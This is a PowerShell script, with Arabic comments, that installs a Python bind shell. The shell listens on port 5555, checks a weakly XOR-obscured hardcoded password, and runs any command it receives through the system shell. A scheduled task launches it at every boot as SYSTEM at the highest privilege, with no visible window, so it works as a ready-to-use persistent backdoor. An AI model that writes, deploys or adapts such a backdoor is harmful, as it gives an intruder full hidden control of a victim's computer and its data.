New-Item -ItemType Directory -Force -Path "C:\RemoteAgent"

$agentCode = @"
import socket
import subprocess
import threading
import sys

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 5555
PASSWORD = "u can see me"

def xor_crypt(data_bytes: bytes, key: str) -> str:
    key_bytes = key.encode('utf-8')
    return "".join([chr(b ^ key_bytes[i % len(key_bytes)]) for i, b in enumerate(data_bytes)])

def handle_client(conn, addr):
    try:
        conn.sendall(b"AUTH_REQUIRED\n")
        auth_data = conn.recv(1024).strip()
        decrypted_pass = xor_crypt(auth_data, "key_xor_2026")
        
        if decrypted_pass != PASSWORD:
            conn.sendall(b"AUTH_FAILED\n")
            conn.close()
            return
            
        conn.sendall(b"AUTH_OK\n")
        while True:
            cmd = conn.recv(4096).decode('utf-8', errors='ignore').strip()
            if not cmd or cmd.lower() in ["exit", "quit"]:
                break
            
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            output = stdout + stderr
            if not output:
                output = b"[+] Command executed successfully with no output.\n"
            conn.sendall(output)
    except Exception:
        pass
    finally:
        conn.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(5)
    while True:
        conn, addr = server.accept()
        t = threading.Thread(target=handle_client, args=(conn, addr))
        t.daemon = True
        t.start()

if __name__ == "__main__":
    main()
"@

[System.IO.File]::WriteAllText("C:\RemoteAgent\agent.py", $agentCode)

# إعادة إنشاء المهمة المجدولة للحساب SYSTEM عند الإقلاع
Unregister-ScheduledTask -TaskName "RemoteAgent" -Confirm:$false -ErrorAction SilentlyContinue

$action = New-ScheduledTaskAction -Execute "C:\Program Files\Python312\pythonw.exe" -Argument "C:\RemoteAgent\agent.py"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "RemoteAgent" -Action $action -Trigger $trigger -Principal $principal

# تشغيل الخدمة فوراً
Start-ScheduledTask -TaskName "RemoteAgent"
